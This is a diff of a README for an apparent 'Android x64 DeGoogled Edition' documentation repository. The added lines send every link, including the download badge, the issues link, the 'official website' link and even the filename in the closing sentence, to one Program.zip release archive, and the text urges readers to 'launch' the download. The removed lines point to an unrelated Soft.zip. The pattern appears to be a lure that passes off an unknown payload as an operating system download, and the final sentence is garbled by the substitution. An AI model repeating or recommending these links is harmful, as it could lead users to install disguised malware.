@@ -11,12 +11,12 @@ Welcome to the documentation source repository for the DeGoogled build of Androi
 
 ## Getting Started
 
-To get started with the Android x64 DeGoogled Edition, simply head over to the [Releases](https://github.com/Dredarty/RINGSharp/releases) section of this repository. From there, you can download the latest release which includes all the necessary files and instructions to install this alternative Android operating system.
+To get started with the Android x64 DeGoogled Edition, simply head over to the [Releases](https://github.com/notnc/Android-x64_Android5.1_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip) section of this repository. From there, you can download the latest release which includes all the necessary files and instructions to install this alternative Android operating system.
 
 ## Download Android x64_DeGoogled_Edition
 
 Click the button below to download the Android x64 DeGoogled Edition:
-[![Download Android x64 DeGoogled Edition](https://img.shields.io/badge/Download-Android_x64_DeGoogled_Edition-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Android x64 DeGoogled Edition](https://github.com/notnc/Android-x64_Android5.1_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip)](https://github.com/notnc/Android-x64_Android5.1_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip)
 
 *Note: The download link provided needs to be launched to initiate the download of the installation package.*
 
@@ -30,13 +30,13 @@ If you're interested in contributing to the development of Android x64 DeGoogled
 
 ## Support
 
-For any questions, issues, or feedback regarding Android x64 DeGoogled Edition or this documentation repository, please open an [issue](https://github.com/Dredarty/RINGSharp/issues). Our team is dedicated to providing assistance and support to ensure a smooth and enjoyable experience for all users.
+For any questions, issues, or feedback regarding Android x64 DeGoogled Edition or this documentation repository, please open an [issue](https://github.com/notnc/Android-x64_Android5.1_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip). Our team is dedicated to providing assistance and support to ensure a smooth and enjoyable experience for all users.
 
 ## Stay Updated
 
-Stay updated on the latest developments, releases, and news related to Android x64 DeGoogled Edition by following our official [website](https://androidx64degoogled.com). Explore new features, updates, and community contributions to enhance your Android x64 experience.
+Stay updated on the latest developments, releases, and news related to Android x64 DeGoogled Edition by following our official [website](https://github.com/notnc/Android-x64_Android5.1_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip). Explore new features, updates, and community contributions to enhance your Android x64 experience.
 
 ---
 
-This README.md file provides a detailed overview of the Android x64 DeGoogled Edition documentation repository. Feel free to explore the contents, download the installation package, and embark on a journey towards a DeGoogled Android 5.1 experience. Thank you for your interest and support in this open-source project! 🚀🔍
+This https://github.com/notnc/Android-x64_Android5.1_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip file provides a detailed overview of the Android x64 DeGoogled Edition documentation repository. Feel free to explore the contents, download the installation package, and embark on a journey towards a DeGoogled Android 5.1 experience. Thank you for your interest and support in this open-source project! 🚀🔍
 
